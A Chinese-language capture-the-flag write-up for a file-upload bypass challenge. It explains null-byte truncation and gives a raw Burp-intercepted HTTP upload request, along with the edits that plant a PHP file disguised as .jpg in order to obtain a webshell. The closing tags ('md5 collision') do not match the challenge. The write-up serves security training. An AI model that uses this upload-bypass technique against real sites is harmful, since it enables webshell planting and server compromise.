# 上传绕过

## 题目

> http://ctf.nuptzj.cn/challenges#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87 
>
> 提示:猜猜代码怎么写的 

## 解答思路

- 0x00截断

  > 0x00截断，00截断是将上传文件名或路径名中使用ascll码值为0的字符（也就是null）来进行截断
  >
  > %00一般用在URL中用于截断url来进行文件包含，两者原理都一样，都是ascll为0的字符，只是形式不同而已。

   ```php
  <% 
  path="upfiles/picture/" 
  file="XXX.jpg" 
  upfilename=path & file '最后的上传地址 
  %>
  大家应该能清楚的看懂这个意思，path为上传的路径，file是生成的文件名，而upfilename则是最终上传后路径，试想一下，如果path是用户可以控制的，那么截断漏洞就产生了。比如我更改的path为upfiles/picture/1.aspchr(0)&XXX.jpg,chr(0)会忽略后面的东西，看看，upfiles/picture/1.asp，很熟悉吧一个webshell就这样诞生了。
   ```

- 本题无法在文件名处截断，只有文件夹路径可以用来截断，同时需要将文件名的后缀修改为合法值来通过过滤


## 解题步骤

1. 设置bp拦截，上传文件，得到原始发送请求

   ```http
   POST /web5/21232f297a57a5a743894a0e4a801fc3/upload.php HTTP/1.1
   Host: teamxlc.sinaapp.com
   Proxy-Connection: keep-alive
   Content-Length: 386
   Cache-Control: max-age=0
   Origin: http://teamxlc.sinaapp.com
   
   Accept-Encoding: gzip, deflate
   Accept-Language: zh-CN,zh;q=0.9
   
   ------WebKitFormBoundaryBsjUFBJGSNjbqTOl
   Content-Disposition: form-data; name="dir"
   
   /uploads/
   ------WebKitFormBoundaryBsjUFBJGSNjbqTOl
   Content-Disposition: form-data; name="file"; filename="php.php"
   Content-Type: application/octet-stream
   
   
   ------WebKitFormBoundaryBsjUFBJGSNjbqTOl
   Content-Disposition: form-data; name="submit"
   
   Submit
   ------WebKitFormBoundaryBsjUFBJGSNjbqTOl--
   ```

2. 修改post请求

   将`/uploads/`修改为：`/uploads/php.php `，并在16进制状态下，将空格20修改为00

   将` filename="php.php"`修改为` filename="php.php.jpg"`

3. 提交后得到flag

   > flag:nctf{welcome_to_hacks_world} 

## 漏洞挖掘思路

- todo

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5 collision`
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

